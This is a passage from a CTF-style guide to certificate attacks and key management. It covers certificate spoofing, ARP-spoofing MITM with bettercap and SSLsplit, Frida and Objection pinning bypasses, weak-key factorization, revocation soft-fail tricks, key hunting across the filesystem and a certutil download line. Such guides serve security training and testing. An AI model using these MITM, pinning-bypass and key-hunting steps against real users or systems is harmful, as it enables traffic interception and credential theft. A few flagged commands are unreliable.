except Exception as e:
    print(f"Signature invalid: {e}")
```

**Common Bypass Patterns:**

- **Null Byte Injection**: Injecting null bytes in certificate fields to truncate validation checks
- **Chain Confusion**: Providing certificates out of order to confuse parsers
- **Missing Basic Constraints**: Exploiting missing CA:TRUE checks in intermediate certificates

**[Inference]** Applications using deprecated libraries (OpenSSL < 1.0.2, older Java versions) may be more susceptible to verification bypasses due to known historical vulnerabilities.

### Self-signed Cert Spoofing

Self-signed certificate spoofing involves creating fraudulent certificates that impersonate legitimate domains or services. While self-signed certificates are cryptographically valid, they lack third-party CA validation, making them useful in man-in-the-middle (MITM) attacks when clients don't properly validate certificate chains.

**Generating Self-signed Certificates:**

```bash
# Basic self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=US/ST=State/L=City/O=Org/CN=target.com"

# With Subject Alternative Names (SAN)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=target.com" \
  -addext "subjectAltName=DNS:target.com,DNS:*.target.com,IP:192.168.1.100"

# Generate with specific signature algorithm
openssl req -x509 -newkey rsa:2048 -sha256 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Creating Convincing Spoofed Certificates:**

```bash
# Extract information from legitimate certificate
openssl s_client -connect target.com:443 -showcerts </dev/null 2>/dev/null | \
  openssl x509 -text -noout > target_cert_info.txt

# Create matching self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout spoof.key -out spoof.crt -days 365 -nodes \
  -subj "/C=US/ST=California/L=San Francisco/O=Target Corp/CN=target.com"

# Convert to different formats
openssl x509 -in spoof.crt -outform DER -out spoof.der
openssl pkcs12 -export -out spoof.p12 -inkey spoof.key -in spoof.crt
```

**Bettercap for MITM with Certificate Spoofing:**

```bash
# Install bettercap
apt-get install bettercap

# Run MITM attack with certificate spoofing
bettercap -iface eth0

# Inside bettercap console:
set http.proxy.sslstrip true
set https.proxy.certificate /path/to/spoofed.crt
set https.proxy.key /path/to/spoofed.key
http.proxy on
https.proxy on
arp.spoof on
```

**SSLsplit for Certificate Spoofing:**

```bash
# Install SSLsplit
apt-get install sslsplit

# Generate CA certificate for spoofing
openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 365 -nodes

# Run SSLsplit
sslsplit -D -l connections.log -j /tmp/sslsplit -S /tmp/sslsplit \
  -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# Configure iptables to redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

**Mobile Application Certificate Pinning Bypass:**

```bash
# Using Frida for Android certificate pinning bypass
frida -U -f com.target.app -l ssl-pinning-bypass.js --no-pause

# Objection for automated bypass
objection -g com.target.app explore
android sslpinning disable
```

**Testing Certificate Trust:**

```bash
# Test if system trusts certificate
curl --cacert spoof.crt https://target.com

# Install certificate in system trust store (Debian/Ubuntu)
cp spoof.crt /usr/local/share/ca-certificates/
update-ca-certificates

# Remove certificate
rm /usr/local/share/ca-certificates/spoof.crt
update-ca-certificates --fresh
```

**CTF-specific Techniques:**

In CTF scenarios, look for applications that:

- Accept any certificate without validation
- Trust user-provided CA certificates
- Have disabled certificate verification in configuration files
- Use hardcoded certificates that can be replaced

### Expired Certificate Misuse

Expired certificate misuse exploits improper validation of certificate validity periods. Systems that fail to check NotBefore and NotAfter fields may accept certificates outside their intended validity window, enabling replay attacks or continued use of compromised certificates.

**Examining Certificate Validity:**

```bash
# Check certificate expiration
openssl x509 -in cert.pem -noout -dates

# Display specific validity fields
openssl x509 -in cert.pem -noout -startdate -enddate

# Check certificate against specific date
openssl x509 -in cert.pem -noout -checkend 86400  # Check if expires in 24 hours

# Verify certificate with date checking
openssl verify -CAfile ca.crt -attime $(date -d "2020-01-01" +%s) cert.pem
```

**Creating Expired Certificates for Testing:**

```bash
# Create certificate with past dates
openssl req -x509 -newkey rsa:2048 -keyout expired.key -out expired.crt \
  -days -365 -nodes -subj "/CN=expired.com"

# Create certificate with specific validity period
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes \
  -subj "/CN=target.com" \
  -not_before 20200101000000Z -not_after 20200201000000Z
```

**[Unverified]** The specific syntax for `-not_before` and `-not_after` may vary across OpenSSL versions. Standard practice uses `-days` parameter. Verify with `openssl req --help` for your version.

**Alternative approach using configuration file:**

```bash
# Create openssl.cnf with custom dates
cat > custom_dates.cnf << EOF
[req]
default_bits = 2048
distinguished_name = req_distinguished_name
x509_extensions = v3_ca

[req_distinguished_name]
CN = target.com

[v3_ca]
# Extensions go here
EOF

# Use faketime to manipulate date during generation
apt-get install faketime
faketime '2020-01-01' openssl req -x509 -newkey rsa:2048 -keyout expired.key \
  -out expired.crt -days 30 -nodes -config custom_dates.cnf
```

**Testing Expired Certificate Acceptance:**

```bash
# Test with curl (should reject by default)
curl --cacert ca.crt https://target.com

# Test with explicit date override (testing mode)
curl --cacert ca.crt --time-cond "2020-06-01" https://target.com

# Python script for testing
python3 << EOF
import ssl
import socket
from datetime import datetime

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # For testing only

with socket.create_connection(('target.com', 443)) as sock:
    with context.wrap_socket(sock, server_hostname='target.com') as ssock:
        cert = ssock.getpeercert()
        print(f"Not Before: {cert['notBefore']}")
        print(f"Not After: {cert['notAfter']}")
EOF
```

**System Time Manipulation:**

```bash
# Temporarily change system time (requires root)
date -s "2020-06-01 12:00:00"

# Run test with modified time
curl https://target.com

# Restore time (use NTP)
ntpdate pool.ntp.org
# or
timedatectl set-ntp true

# Use faketime for isolated testing
faketime '2020-06-01' curl https://target.com
```

**Windows-specific Testing:**

```powershell
# Check certificate validity in Windows
certutil -verify cert.cer

# Import expired certificate to test acceptance
certutil -addstore "Root" expired.cer

# Remove test certificate
certutil -delstore "Root" <SerialNumber>
```

**Application-level Exploitation:**

```bash
# Java applications - disable certificate validation
java -Dcom.sun.net.ssl.checkRevocation=false \
     -Djava.security.debug=certpath \
     -jar application.jar

# Node.js - disable certificate validation (testing)
NODE_TLS_REJECT_UNAUTHORIZED=0 node app.js
```

**CTF Reconnaissance for Expired Certificates:**

```bash
# Scan for expired certificates on network
nmap -p 443 --script ssl-cert target.com

# Extract and analyze certificate dates
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -dates

# Automated scanning with testssl.sh
testssl.sh --warnings batch https://target.com | grep -i expir
```

**Common Exploitation Scenarios:**

- Legacy systems that don't validate certificate dates
- Embedded devices with incorrect system clocks
- Applications that cache certificate validation results
- IoT devices without secure time synchronization

### Weak Signature Algorithms

Weak signature algorithms in certificates refer to outdated or cryptographically broken hash functions and signing schemes. Common weak algorithms include MD5, SHA-1, and RSA with insufficient key lengths. These can be exploited through collision attacks or brute-force techniques.

**Identifying Weak Signature Algorithms:**

```bash
# Check certificate signature algorithm
openssl x509 -in cert.pem -text -noout | grep "Signature Algorithm"

# Examine public key size
openssl x509 -in cert.pem -text -noout | grep "Public-Key"

# Full certificate analysis
openssl x509 -in cert.pem -text -noout | grep -E "(Signature Algorithm|Public-Key)"

# Scan remote server for weak algorithms
nmap --script ssl-enum-ciphers -p 443 target.com

# Using testssl.sh for comprehensive analysis
testssl.sh --vulnerable https://target.com
```

**Common Weak Algorithms:**

- **MD5withRSA**: Vulnerable to collision attacks (broken since 2004)
- **SHA1withRSA**: Deprecated, collision attacks demonstrated (SHAttered attack, 2017)
- **RSA < 2048 bits**: Susceptible to factorization attacks
- **DSA < 2048 bits**: Weak discrete logarithm problem

**Creating Certificates with Weak Algorithms:**

```bash
# Generate MD5-signed certificate (for testing)
openssl req -x509 -newkey rsa:1024 -md5 -keyout weak.key -out weak_md5.crt \
  -days 365 -nodes -subj "/CN=weak.com"

# Generate SHA-1 signed certificate
openssl req -x509 -newkey rsa:2048 -sha1 -keyout weak.key -out weak_sha1.crt \
  -days 365 -nodes -subj "/CN=weak.com"

# Generate certificate with weak RSA key (512-bit)
openssl req -x509 -newkey rsa:512 -sha256 -keyout weak.key -out weak_rsa.crt \
  -days 365 -nodes -subj "/CN=weak.com"
```

**HashClash for MD5 Collisions:**

```bash
# Clone HashClash toolkit
git clone https://github.com/cr-marcstevens/hashclash.git
cd hashclash

# Build tools (requires significant compilation)
mkdir build && cd build
cmake ..
make

# Generate MD5 collision (computationally intensive)
./md5_fastcoll -p prefix.bin -o collision1.bin collision2.bin
```

**[Unverified]** Practical MD5 collision attacks on certificates require significant computational resources and specific prefix conditions. Demonstration feasibility in CTF timeframes depends on challenge design.

**SHA-1 Collision Tools:**

```bash
# SHAttered attack demonstration (requires pre-computed collisions)
# Download collision PDFs from https://shattered.io/
wget https://shattered.io/static/shattered-1.pdf
wget https://shattered.io/static/shattered-2.pdf

# Verify both have same SHA-1 but different content
sha1sum shattered-1.pdf shattered-2.pdf
sha256sum shattered-1.pdf shattered-2.pdf
```

**RSA Key Factorization Testing:**

```bash
# Extract public key from certificate
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem

# Extract modulus
openssl rsa -pubin -in pubkey.pem -text -noout | grep -A 50 "modulus"

# Use RsaCtfTool for weak key analysis
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt

# Attack weak RSA key
python3 RsaCtfTool.py --publickey pubkey.pem --private

# Test for common factorization weaknesses
python3 RsaCtfTool.py --publickey pubkey.pem --attack wiener,fermat,noveltyprimes
```

**YAFU for Factorization:**

```bash
# Install YAFU
apt-get install yafu

# Factor RSA modulus
yafu "factor(<modulus_value>)"

# For larger numbers, use with ECM
yafu "factor(<modulus_value>)" -ecm
```

**Server Cipher Suite Testing:**

```bash
# Test supported cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com

# SSLyze for detailed analysis
pip3 install sslyze
sslyze --regular target.com:443

# Check for specific weak algorithms
sslyze --certinfo target.com:443 | grep -E "(MD5|SHA1|512|1024)"
```

**Certificate Analysis with Python:**

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes

with open('cert.pem', 'rb') as f:
    cert = x509.load_pem_x509_certificate(f.read(), default_backend())

# Check signature algorithm
sig_algo = cert.signature_algorithm_oid._name
print(f"Signature Algorithm: {sig_algo}")

# Check key size
public_key = cert.public_key()
key_size = public_key.key_size
print(f"Key Size: {key_size} bits")

# Identify weak algorithms
weak_algos = ['md5', 'sha1']
if any(weak in sig_algo.lower() for weak in weak_algos):
    print("WARNING: Weak signature algorithm detected")

if key_size < 2048:
    print("WARNING: Weak key size detected")
```

**Policy-based Testing:**

```bash
# OpenSSL with security level restrictions
openssl s_client -connect target.com:443 -cipher DEFAULT@SECLEVEL=2

# Test with different security levels:
# SECLEVEL=0: Everything permitted
# SECLEVEL=1: 80-bit security (RSA >= 1024)
# SECLEVEL=2: 112-bit security (RSA >= 2048, no MD5/SHA1)
# SECLEVEL=3: 128-bit security (RSA >= 3072)
```

**Windows-specific Analysis:**

```powershell
# Export certificate from Windows store
certutil -store My <SerialNumber> cert.cer

# Verify signature algorithm
certutil -verify cert.cer

# Check for weak algorithms in system
certutil -verifystore -v Root | Select-String -Pattern "md5|sha1|Algorithm"
```

**CTF Exploitation Patterns:**

Look for:

- Legacy systems accepting SHA-1 or MD5 certificates
- Custom certificate validation implementations with algorithm whitelist bypasses
- Certificates with 1024-bit or smaller RSA keys (factorizable)
- Downgrade attacks forcing negotiation of weak cipher suites

**Important Subtopics for Certificate Attacks:**

- **Certificate Pinning Bypass**: Mobile application security testing, Frida scripting
- **Certificate Transparency Logs**: Reconnaissance using crt.sh, Censys
- **OCSP/CRL Manipulation**: Revocation checking bypasses
- **CA Trust Store Poisoning**: System-level certificate injection

---

## Key Management

### Key Rotation

Key rotation is the practice of periodically replacing cryptographic keys to limit exposure if a key is compromised and reduce the volume of data encrypted under a single key.

**Core Concepts:**

- **Rotation Period**: Keys should be rotated based on usage volume, data sensitivity, and threat model. Common intervals range from 90 days to annually.
- **Rotation Types**:
    - **Manual rotation**: Administrator-triggered replacement
    - **Automatic rotation**: Scheduled or threshold-based replacement
    - **Emergency rotation**: Immediate replacement due to suspected compromise

**Identifying Key Rotation Issues in CTFs:**

Check for outdated or weak keys:

```bash
# Examine certificate validity periods
openssl x509 -in cert.pem -noout -dates

# Check key creation timestamps in SSH
stat -c '%y' ~/.ssh/id_rsa

# Analyze JWT token expiration
echo "eyJhbGc..." | cut -d'.' -f2 | base64 -d | jq '.exp'
```

**Common Vulnerabilities:**

- **No rotation policy**: Keys used indefinitely increase compromise risk
- **Incomplete rotation**: Old keys remain valid alongside new ones
- **Predictable rotation patterns**: Keys generated with timestamps or sequential patterns

**Exploitation Techniques:**

Look for backup or archived keys:

```bash
# Search for old key files
find / -name "*.key.old" -o -name "*.key.bak" 2>/dev/null

# Check for version-controlled keys
find / -name ".git" -exec grep -r "BEGIN.*PRIVATE KEY" {} \; 2>/dev/null

# Examine key rotation logs
grep -i "key.rotation\|rotate.*key" /var/log/* 2>/dev/null
```

Test for simultaneous validity of multiple key versions:

```bash
# Try authenticating with older key versions
ssh -i old_key.pem user@target
ssh -i current_key.pem user@target

# Test API keys with different timestamps
curl -H "Authorization: Bearer OLD_TOKEN" https://api.target.com/endpoint
```

**[Inference]** Many CTF challenges leave old keys accessible after rotation without proper revocation, allowing attackers to use expired credentials.

**Tools for Key Rotation Analysis:**

```bash
# Check SSH key age and usage
ssh-keygen -l -f ~/.ssh/id_rsa
ls -la ~/.ssh/

# Analyze SSL/TLS certificate chains for rotation patterns
nmap --script ssl-cert -p 443 target.com

# Check for key reuse across services
hashcat --stdout old_key.pem | md5sum
hashcat --stdout new_key.pem | md5sum
```

### Certificate Pinning

Certificate pinning validates that a server's certificate matches a pre-configured expected value, preventing man-in-the-middle attacks even with compromised CAs.

**Pinning Methods:**

- **Certificate pinning**: Pin entire certificate (DER or PEM encoded)
- **Public key pinning**: Pin only the public key (more flexible during rotation)
- **Hash pinning**: Pin hash of certificate or public key (HPKP - deprecated in browsers but used in apps)

**Extracting Pinned Certificates:**

From Android APKs:

```bash
# Decompile APK
apktool d application.apk -o app_extracted

# Search for pinning configurations
grep -r "sha256" app_extracted/
grep -r "certificate" app_extracted/res/xml/
grep -r "TrustManager\|HostnameVerifier" app_extracted/

# Check network security config
cat app_extracted/res/xml/network_security_config.xml
```

From iOS apps:

```bash
# Extract IPA
unzip application.ipa

# Search for pinned certificates
find Payload/ -name "*.der" -o -name "*.cer"
strings Payload/App.app/App | grep -i "certificate\|pinnin"

# Check Info.plist for App Transport Security
plutil -p Payload/App.app/Info.plist | grep -A 10 NSAppTransportSecurity
```

**Bypassing Certificate Pinning:**

Using Frida (Android/iOS):

```bash
# Install Frida server on device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# List running applications
frida-ps -U

# Bypass pinning with universal script
frida -U -f com.target.app -l frida-universal-ssl-pinning-bypass.js --no-pause
```

Common Frida bypass scripts:

```javascript
// Universal Android SSL pinning bypass
Java.perform(function() {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    TrustManager.checkServerTrusted.implementation = function(chain, authType) {
        console.log('[+] Bypassing SSL pinning');
    };
});
```

Using Objection:

```bash
# Install objection
pip3 install objection

# Launch with SSL unpinning
objection -g com.target.app explore

# Disable pinning
android sslpinning disable
```

**Static Patching Methods:**

Modify APK to disable pinning:

```bash
# Decompile APK
apktool d app.apk

# Edit network_security_config.xml to trust user certificates
cat > res/xml/network_security_config.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
EOF

# Rebuild and sign
apktool b app -o app_patched.apk
keytool -genkey -v -keystore resign.keystore -alias resign -keyalg RSA -keysize 2048 -validity 10000
jarsigner -keystore resign.keystore app_patched.apk resign
zipalign -v 4 app_patched.apk app_final.apk
```

**Testing for Weak Pinning:**

```bash
# Intercept with Burp Suite proxy
adb shell settings put global http_proxy <burp_ip>:8080

# Install Burp CA certificate
openssl x509 -inform DER -in cacert.der -out cacert.pem
adb push cacert.pem /sdcard/
# Install via Settings > Security > Install from storage

# Test if pinning is enforced
# If app works with proxy, pinning is bypassed or absent
```

**[Unverified]** Some implementations check certificate validity only on first connection, allowing pinning bypass through certificate caching manipulation.

### Revocation (CRL, OCSP)

Certificate revocation mechanisms allow CAs to invalidate certificates before expiration when compromised or no longer trusted.

**Certificate Revocation List (CRL):**

CRLs are periodically published lists of revoked certificate serial numbers.

Downloading and parsing CRLs:

```bash
# Extract CRL distribution point from certificate
openssl x509 -in cert.pem -noout -text | grep -A 4 "CRL Distribution"

# Download CRL
wget http://crl.example.com/crl.pem

# Parse CRL contents
openssl crl -in crl.pem -noout -text

# Check if specific certificate is revoked
openssl crl -in crl.pem -noout -text | grep -A 2 "Serial Number: 1A2B3C"
```

Verify certificate against CRL:

```bash
# Download certificate and CRL
openssl s_client -connect target.com:443 -showcerts < /dev/null 2>&1 | openssl x509 -outform PEM > cert.pem

# Extract CRL URL
CRL_URL=$(openssl x509 -in cert.pem -noout -text | grep -A 4 "CRL Distribution" | grep URI | cut -d: -f2-)

# Download and check
wget -O crl.der $CRL_URL
openssl crl -inform DER -in crl.der -outform PEM -out crl.pem
openssl verify -crl_check -CRLfile crl.pem -CAfile ca.pem cert.pem
```

**Online Certificate Status Protocol (OCSP):**

OCSP provides real-time certificate status checks via HTTP requests.

Manual OCSP query:

```bash
# Extract OCSP responder URL from certificate
openssl x509 -in cert.pem -noout -ocsp_uri

# Get certificate and issuer
openssl s_client -connect target.com:443 -showcerts < /dev/null 2>&1 | openssl x509 > cert.pem
# Issuer certificate usually in chain, extract manually or download

# Perform OCSP request
openssl ocsp -issuer issuer.pem -cert cert.pem -url http://ocsp.example.com -text
```

Interpret OCSP responses:

- **Good**: Certificate is valid and not revoked
- **Revoked**: Certificate has been revoked
- **Unknown**: OCSP responder has no information about certificate

**Exploiting Revocation Weaknesses:**

Test for missing revocation checks:

```bash
# Check if application validates revocation
# Use a known revoked certificate (test certificates available from certificate authorities)

# Intercept and block OCSP requests
iptables -A OUTPUT -p tcp --dport 80 -j DROP
iptables -A OUTPUT -p tcp --dport 443 -m string --string "ocsp" --algo bm -j DROP

# Test if application still accepts certificate (soft-fail vulnerability)
curl --cert revoked_cert.pem --key revoked_key.pem https://target.com
```

**OCSP Stapling Analysis:**

OCSP stapling has servers include OCSP responses with TLS handshake, reducing privacy leaks and latency.

```bash
# Test if server supports OCSP stapling
openssl s_client -connect target.com:443 -status -tlsextdebug < /dev/null 2>&1 | grep -A 17 "OCSP Response"

# Check OCSP stapling with nmap
nmap --script ssl-cert,ssl-enum-ciphers -p 443 target.com
```

**Common Revocation Issues in CTFs:**

1. **Soft-fail implementations**: Applications continue if revocation check fails (network error, timeout)

```bash
# Block OCSP/CRL access and test
iptables -A OUTPUT -d ocsp.ca.com -j DROP
# Test if expired/revoked cert still works
```

2. **Stale CRL caching**: Applications cache CRLs beyond their validity period

```bash
# Check CRL nextUpdate field
openssl crl -in cached_crl.pem -noout -nextupdate
# If past current date, CRL is stale
```

3. **Missing revocation checks**: No CRL or OCSP validation performed

```bash
# Test with known revoked certificate
# If connection succeeds, revocation not checked
openssl s_client -connect target.com:443 -cert revoked.pem -key revoked.key
```

**Tools for Revocation Testing:**

```bash
# Check revocation status with crt.sh
curl -s "https://crt.sh/?q=example.com&output=json" | jq

# Automated certificate validation with testssl.sh
./testssl.sh --protocols --cipher-per-proto target.com

# Check for OCSP stapling support
echo | openssl s_client -connect target.com:443 -status 2>&1 | grep "OCSP Response Status"
```

**[Inference]** Many CTF challenges exploit soft-fail revocation checking by simulating network failures to OCSP/CRL endpoints, allowing revoked certificates to be accepted.

**Important Related Topics:**

- Certificate Transparency Logs (for detecting mis-issued certificates)
- Hardware Security Modules (HSMs) for secure key storage during rotation
- Key Derivation Functions (KDFs) in key hierarchy management

---

## Tools

### openssl x509

The `openssl x509` command is the primary tool for parsing, verifying, and manipulating X.509 certificates in CTF scenarios. X.509 certificates contain public keys, subject/issuer information, validity periods, and extensions that may hide flags or reveal cryptographic weaknesses.

**Basic Certificate Parsing**

```bash
# Display certificate in human-readable format
openssl x509 -in certificate.crt -text -noout

# Display certificate in PEM format
openssl x509 -in certificate.crt -text

# Parse DER-encoded certificate
openssl x509 -in certificate.der -inform DER -text -noout

# Extract specific fields
openssl x509 -in certificate.crt -noout -subject
openssl x509 -in certificate.crt -noout -issuer
openssl x509 -in certificate.crt -noout -dates
openssl x509 -in certificate.crt -noout -serial
openssl x509 -in certificate.crt -noout -fingerprint
```

**CTF-Relevant Operations**

```bash
# Extract public key from certificate
openssl x509 -in certificate.crt -noout -pubkey > pubkey.pem

# Convert certificate formats
openssl x509 -in certificate.crt -outform DER -out certificate.der
openssl x509 -in certificate.der -inform DER -outform PEM -out certificate.pem

# Display modulus (useful for RSA key comparison)
openssl x509 -in certificate.crt -noout -modulus

# Check certificate signature algorithm
openssl x509 -in certificate.crt -noout -text | grep "Signature Algorithm"

# Extract certificate extensions (may contain hidden data)
openssl x509 -in certificate.crt -noout -text | grep -A 20 "X509v3 extensions"

# Verify certificate against CA
openssl verify -CAfile ca.crt certificate.crt

# Display certificate in various hash formats
openssl x509 -in certificate.crt -noout -subject_hash
openssl x509 -in certificate.crt -noout -issuer_hash
```

**Certificate Chain Analysis**

```bash
# Parse certificate chain
openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text -noout

# Verify certificate chain
openssl verify -CAfile root.crt -untrusted intermediate.crt certificate.crt

# Extract all certificates from bundle
openssl storeutl -certs chain.pem
```

**Common CTF Scenarios**

- **Flag in extensions**: Check `Subject Alternative Name`, `Certificate Policies`, or custom extensions
- **Weak keys**: Extract modulus and check bit length or known weak key databases
- **Modified signatures**: Compare signature algorithms or verify against CA
- **Hidden data in serial numbers**: Serial numbers may encode flags in hex/decimal
- **Certificate transparency logs**: Subject/Issuer fields may contain encoded data

---

### keytool (Java)

Java's `keytool` utility manages Java KeyStore (JKS) files containing certificates and private keys. JKS files are commonly encountered in Java-based CTF challenges, Android APK analysis, and enterprise application scenarios.

**Keystore Inspection**

```bash
# List all entries in keystore
keytool -list -keystore keystore.jks

# List with password prompt
keytool -list -keystore keystore.jks -storepass changeit

# Verbose listing (shows certificate details)
keytool -list -v -keystore keystore.jks -storepass changeit

# List specific alias
keytool -list -alias mykey -keystore keystore.jks -storepass changeit

# Check keystore type
keytool -list -keystore keystore.jks -storetype JKS
keytool -list -keystore keystore.p12 -storetype PKCS12
```

**Certificate Export**

```bash
# Export certificate from keystore
keytool -exportcert -alias mykey -keystore keystore.jks -file cert.crt -storepass changeit

# Export in PEM format (requires conversion)
keytool -exportcert -alias mykey -keystore keystore.jks -rfc -file cert.pem -storepass changeit

# Export entire chain
keytool -exportcert -alias mykey -keystore keystore.jks -rfc -file chain.pem -storepass changeit
```

**Keystore Manipulation**

```bash
# Import certificate
keytool -import -alias newcert -file certificate.crt -keystore keystore.jks -storepass changeit

# Delete entry
keytool -delete -alias mykey -keystore keystore.jks -storepass changeit

# Change keystore password
keytool -storepasswd -keystore keystore.jks

# Change key password
keytool -keypasswd -alias mykey -keystore keystore.jks

# Convert JKS to PKCS12
keytool -importkeystore -srckeystore keystore.jks -destkeystore keystore.p12 -deststoretype PKCS12
```

**CTF-Relevant Techniques**

```bash
# Check for weak passwords (default is "changeit" or "changeme")
keytool -list -keystore keystore.jks -storepass changeit
keytool -list -keystore keystore.jks -storepass changeme
keytool -list -keystore keystore.jks -storepass password

# Extract and analyze certificate details
keytool -list -v -keystore keystore.jks -storepass changeit | grep -E "Alias|Serial|Owner|Issuer"

# Identify certificate chain depth
keytool -list -v -keystore keystore.jks -storepass changeit | grep "Certificate chain length"
```

**Common CTF Scenarios**

- **Default passwords**: Try standard passwords (`changeit`, `changeme`, empty password)
- **Hidden aliases**: Some keys may have non-obvious alias names
- **Certificate data**: Flags may be in certificate fields (CN, OU, serial number)
- **Keystore integrity**: Modified keystores may have signature mismatches

---

### gpg

GNU Privacy Guard (GPG) handles OpenPGP certificates, which contain public keys, user IDs, signatures, and trust information. GPG certificates differ from X.509 certificates in structure and are commonly used for email encryption and file signing.

**Certificate Import and Listing**

```bash
# Import public key/certificate
gpg --import publickey.asc

# List imported keys
gpg --list-keys

# List with fingerprints
gpg --fingerprint

# List secret keys
gpg --list-secret-keys

# Show key details in machine-readable format
gpg --with-colons --list-keys
```

**Certificate Export**

```bash
# Export public key
gpg --export --armor user@example.com > publickey.asc

# Export secret key (use cautiously)
gpg --export-secret-keys --armor user@example.com > secretkey.asc

# Export specific key by fingerprint
gpg --export --armor FINGERPRINT > key.asc

# Export minimal key (without signatures)
gpg --export-options export-minimal --export --armor user@example.com
```

**Certificate Analysis**

```bash
# Display packet details (shows internal structure)
gpg --list-packets publickey.asc

# Detailed packet analysis with offsets
gpg --list-packets --verbose publickey.asc

# Check key validity and trust
gpg --check-sigs user@example.com

# Display key server information
gpg --keyid-format long --list-keys
```

**Certificate Verification**

```bash
# Verify signature on file
gpg --verify signature.sig file.txt

# Verify detached signature
gpg --verify document.sig document.pdf

# Verify and extract signed message
gpg --decrypt signed_message.asc
```

**Key Manipulation**

```bash
# Edit key (interactive)
gpg --edit-key user@example.com

# Add user ID to key
gpg --quick-add-uid FINGERPRINT "New Name <new@email.com>"

# Sign someone's key
gpg --sign-key user@example.com

# Delete key
gpg --delete-key user@example.com
gpg --delete-secret-key user@example.com
```

**CTF-Relevant Commands**

```bash
# Extract key creation date, algorithm, key size
gpg --list-packets publickey.asc | grep -E "created|algo|keyid"

# Check for weak keys (short key length)
gpg --list-keys --keyid-format long | grep -E "rsa1024|dsa1024"

# Extract key comments (may contain flags)
gpg --list-packets publickey.asc | grep "comment"

# Check key expiration
gpg --list-keys | grep -E "expired|expires"

# Export key in binary format for hex analysis
gpg --export user@example.com > key.bin
xxd key.bin
```

**Common CTF Scenarios**

- **User ID fields**: Name, email, comment fields may contain encoded flags
- **Key metadata**: Creation timestamps, algorithm choices may be hints
- **Weak keys**: Short key lengths (512-1024 bit RSA) vulnerable to factorization
- **Signature analysis**: Multiple signatures may reveal relationships or timestamps
- **Packet structure**: Flags may be hidden in custom packet types or user attributes

---

### certutil (Windows)

**[Inference]** Windows `certutil` is the native certificate management tool for Windows systems. While primarily used for Windows certificate stores, it's valuable in CTF scenarios involving Windows forensics, enterprise environments, or cross-platform certificate analysis.

**Certificate Parsing**

```cmd
# Display certificate information
certutil -dump certificate.crt

# Parse certificate with verbose output
certutil -v -dump certificate.crt

# Decode Base64-encoded certificate
certutil -decode certificate.b64 certificate.crt

# Encode certificate to Base64
certutil -encode certificate.crt certificate.b64

# Parse DER certificate
certutil -asn certificate.der
```

**Hash Operations**

```cmd
# Calculate file hash (default SHA1)
certutil -hashfile certificate.crt

# Calculate specific hash
certutil -hashfile certificate.crt MD5
certutil -hashfile certificate.crt SHA256
certutil -hashfile certificate.crt SHA512
```

**Certificate Store Operations**

```cmd
# List certificates in store
certutil -store My
certutil -store Root
certutil -store CA

# Display user certificates
certutil -user -store My

# Export certificate from store
certutil -store My 0 certificate.crt
```

**URL and Remote Operations**

```cmd
# Download file (note: this is commonly flagged as suspicious)
certutil -urlcache -f http://example.com/file.txt output.txt

# Clear URL cache
certutil -urlcache * delete
```

**Encoding/Decoding Operations**

```cmd
# Decode hex-encoded data
certutil -decodehex input.hex output.bin

# Encode to hex
certutil -encodehex input.bin output.hex

# Decode Base64 with specific encoding
certutil -decode -f input.b64 output.bin
```

**CTF-Relevant Commands**

```cmd
# Parse certificate for extensions
certutil -v -dump certificate.crt | findstr "Extension"

# Extract public key information
certutil -dump certificate.crt | findstr "Public Key"

# Check certificate chain
certutil -verify certificate.crt

# Display ASN.1 structure (useful for hidden data)
certutil -asn certificate.crt
```

**Cross-Platform Usage via Wine**

[Inference] On Kali Linux, `certutil` can be executed through Wine for Windows-specific certificate formats:

```bash
wine certutil -dump certificate.crt
wine certutil -hashfile file.exe SHA256
```

**Common CTF Scenarios**

- **Windows certificate stores**: Extracting certificates from memory dumps or registry hives
- **Encoded data**: Base64/hex encoding often used to obfuscate flags
- **Hash verification**: Comparing certificate hashes against known values
- **ASN.1 analysis**: Hidden data in certificate structure visible through ASN.1 parsing

---

### Online Certificate Decoders

Online tools provide quick certificate analysis without local tool setup. These are useful for initial reconnaissance but should be supplemented with local tools for sensitive data.

**[Unverified]** Common online certificate decoders (verify URLs independently):

- **SSL Labs SSL Server Test**: Analyzes TLS/SSL configurations and certificate chains
- **CertLogik**: PEM/DER certificate decoder with visual formatting
- **SSL Shopper**: Certificate decoder and chain validator
- **Red Kestrel CSR/Certificate Decoder**: Detailed ASN.1 parsing
- **Entrust Certificate Decoder**: X.509 certificate parsing

**Typical Features**

- PEM/DER format parsing
- Certificate chain visualization
- Extension decoding
- Public key extraction
- Signature algorithm identification
- Validity period display

**CTF Usage Considerations**

- **No sensitive data**: Never upload private keys or challenge certificates containing flags to public services
- **Rate limiting**: Online tools may have request limits
- **Local alternatives preferred**: Use `openssl`, `keytool`, or `gpg` for sensitive analysis
- **Cross-validation**: Compare online results with local tool output to detect manipulation

**When Online Tools Are Appropriate**

- Initial reconnaissance of public certificates
- Quick format identification (PEM vs DER)
- Certificate chain visualization for complex hierarchies
- Learning certificate structure before local analysis

**Related Techniques**

After identifying certificate properties with these tools, typical CTF workflows involve:

